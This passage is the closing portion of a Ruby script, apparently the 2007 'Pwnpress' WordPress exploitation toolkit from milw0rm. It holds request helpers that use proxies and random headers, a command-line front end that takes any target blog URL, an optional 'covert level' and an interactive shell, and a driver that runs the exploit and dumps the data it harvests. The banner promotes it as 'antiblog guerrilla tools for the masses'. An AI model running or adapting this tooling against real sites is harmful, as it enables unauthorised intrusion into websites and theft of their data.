            wp_url = URI.parse(&quot;http://wordpress.org/download/release-archive/&quot;)
            @wp_versions = [] # not nil, since we need self.index(version_to_check)
    
            archive = retrieve_content('', wp_url)
            if archive
                tmp = archive.scan(/http:\/\/wordpress.org\/wordpress-(.+?).zip/)
                if tmp
                    @wp_versions = tmp.uniq
                end
            end
        end
    end
    
    # Send a XML-RPC request with data xml and path of xmlrpc.php at xmlrpc_path.
    # Returns the response body received from the server or nil if failed.
    # Uses random headers or given parameter (avoids recursion in some places).
    def send_xmlrpc(xml, xmlrpc_path)
        xml_response = &quot;&quot;
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.post(@url.path + xmlrpc_path, xml, self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   xml_response = res.body
               else
                   xml_response = nil
           end
        }
        
        return xml_response
    end
    
    # Sends a HTTP GET request to retrieve content available at specified
    # relative path path to my_url (ex. my_url being the base Wordpress directory
    # and path a file available within that directory).
    # Uses random headers.
    def retrieve_content(path, my_url = @url, headers = nil, return_res = false)
        body = &quot;&quot;
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(my_url.host,
                               my_url.port) { |http|
           if headers
               extra_headers = headers
           else
               extra_headers = self.random_headers
           end
           
           res = http.get(my_url.path + path, extra_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   body = res.body
               else
                   if return_res
                       body = res
                   else
                       body = nil
                   end
           end
        }
        
        return body
    end
end

# if $0 =~ /pwnpress.rb/
if $0 != /666/
    require 'optparse'

    OPTIONS = {}
    
    def vputs(msg)
        if OPTIONS[:verbose]
            puts &quot;+&gt; #{msg}&quot;
        end
    end

    if ARGV.size == 0
        puts &quot;Psychic capabilities not yet implemented, sorry. Need arguments.&quot;
        exit
    end

    puts &quot;&gt; Pwnpress: Wordpress exploitation toolkit #{Pwnpress::PWNPRESS_VERSION}&quot;
    puts &quot;&gt; 'High quality antiblog guerrilla tools for the masses.'&quot;
    puts &quot;&gt; (c) 2006, 2007 Lance M. Havok &lt;lmh [at] info-pull.com&gt;&quot;
    
    # Let the Internet Hate Machine deliver:
    begin
        OptionParser.new do |opts|
            opts.banner = &quot;Usage: #{$0} [options]&quot;
            
            OPTIONS[:verbose]      = false
            OPTIONS[:fingerprint]  = true
            OPTIONS[:version]      = &quot;auto&quot; # by default, try to guess version
            OPTIONS[:proxy_host]   = nil    # if nil, default to direct conn
            OPTIONS[:proxy_port]   = nil    # if nil, default to direct conn
            OPTIONS[:table_prefix] = nil    # if nil, Pwnpress retrieves it
            OPTIONS[:username]     = nil
            OPTIONS[:password]     = nil
            OPTIONS[:covert_level] = 0      # by default, try everything.
            OPTIONS[:irb_shell]    = nil
            
            opts.on(&quot;--[no-]verbose&quot;, &quot;Run verbosely&quot;) do |v|
                OPTIONS[:verbose] = v
            end
            
            opts.on(&quot;-t&quot;, &quot;--target TARGET_URL&quot;, &quot;Target URL (inc. WP path)&quot;) do |t|
                unless t =~ /(http|https):\/\/(.*)\//i
                    raise &quot;Target must be in form: http(s)://domain.tld/wp/&quot;
                end
                OPTIONS[:target] = t
            end
            
            opts.separator &quot;&quot;
            opts.separator &quot;Optional and extra settings:&quot;
            
            opts.on(&quot;-u&quot;, &quot;--username USER&quot;, &quot;Valid username&quot;) do |u|
                OPTIONS[:username] = u
            end
            
            opts.on(&quot;-p&quot;, &quot;--password PASSWD&quot;, &quot;Valid password for user&quot;) do |p|
                OPTIONS[:password] = p
            end
            
            opts.on(&quot;-v&quot;, &quot;--version VERSION&quot;, &quot;Target (full) version&quot;) do |n|
                OPTIONS[:version] = n
            end
            
            opts.on(&quot;--prefix PREFIX&quot;, &quot;Wordpress tables prefix (ex. wp)&quot;) do |x|
                OPTIONS[:table_prefix] = x
            end
            
            opts.on(&quot;-c&quot;, &quot;--covert LEVEL&quot;, &quot;Covert level (0-2)&quot;) do |c|
                OPTIONS[:covert_level] = c
            end
            
            opts.on(&quot;-i&quot;, &quot;--irb&quot;, &quot;Execute an interactive IRB shell&quot;) do |i|
                OPTIONS[:irb_shell] = i
            end
            
            opts.on(&quot;--proxy HOST:PORT&quot;, &quot;Use proxy at given host and port&quot;) do |p|
                unless p =~ /(.*):(.*)/i
                    raise &quot;Proxy setting must be in form: host:port&quot;
                end
                proxy = p.scan(/(.*):(.*)/i).flatten!
                OPTIONS[:proxy_host] = proxy[0]
                OPTIONS[:proxy_port] = proxy[1].to_i
            end
            
            opts.on(&quot;-f&quot;, &quot;--[no-]fingerprint&quot;, &quot;Disable fingerprinting&quot;) do |f|
                OPTIONS[:fingerprint] = false
            end
            
            opts.separator &quot;&quot;
        end.parse!
    rescue
        puts &quot;&gt; Please check arguments validity. See --help.&quot;
        puts &quot;Error: &quot; + $!
        exit
    end
    
    vputs &quot;Settings:&quot;
    vputs &quot;  target:      #{OPTIONS[:target]}&quot;
    vputs &quot;  fingerprint: #{OPTIONS[:fingerprint]}&quot;
    vputs &quot;  wp version:  #{OPTIONS[:version]}&quot;
    
    if OPTIONS[:proxy_host] and OPTIONS[:proxy_port]
        vputs &quot;  proxy host:  #{OPTIONS[:proxy_host]}&quot;
        vputs &quot;  proxy port:  #{OPTIONS[:proxy_port]}&quot;
    end
    if OPTIONS[:username] and OPTIONS[:password]
        vputs &quot;  username:    #{OPTIONS[:username]}&quot;
        vputs &quot;  password:    #{OPTIONS[:password]}&quot;
    end

    # Seek. Target. Deliver.
    begin
        pwnInstance = Pwnpress.new(OPTIONS)
        
        if OPTIONS[:irb_shell]
            puts &quot;&gt; Executing interactive IRB shell, have fun.&quot;
            IRB.start
            puts &quot;&gt; Continuing...&quot;
        end

        pwnInstance.exploit
        
        puts &quot;&gt; Finished. Dumping results, if any.&quot;
        if pwnInstance.results.size &gt; 0
            puts &quot;&quot;
            pwnInstance.results.each do |r|
                $stderr.puts &quot;-------------------- RESULTS: &quot; + r[0].to_s
                $stderr.puts &quot; Data type: &quot; + r[1][:data_type].to_s
                $stderr.puts &quot; Size:      &quot; + r[1][:data].size.to_s
                
                # This obscure piece of code simply pretty-prints data contained
                # in a hash. We use a generic method to avoid code bloat and
                # do it as elegant as possible.
                r[1][:data].each do |n|
                    str = &quot;\n&quot; + (&quot; &quot; * 2) + n[0].to_s + &quot;\n&quot;
                    n[1].each do |i|
                        str &lt;&lt; (&quot; &quot; * 3) + i[0].to_s
                        str &lt;&lt; &quot;\t : #{i[1].to_s}\n&quot;
                    end
                    
                    $stderr.print(str)
                end
                puts &quot;&quot;
            end
        end
    rescue =&gt; e
        puts &quot;&gt; Error: #{e.message}&quot;
        puts &quot;&gt; Ruby backtrace follows:&quot;
        puts e.backtrace
    end
end

# milw0rm.com [2007-09-14]</pre></html>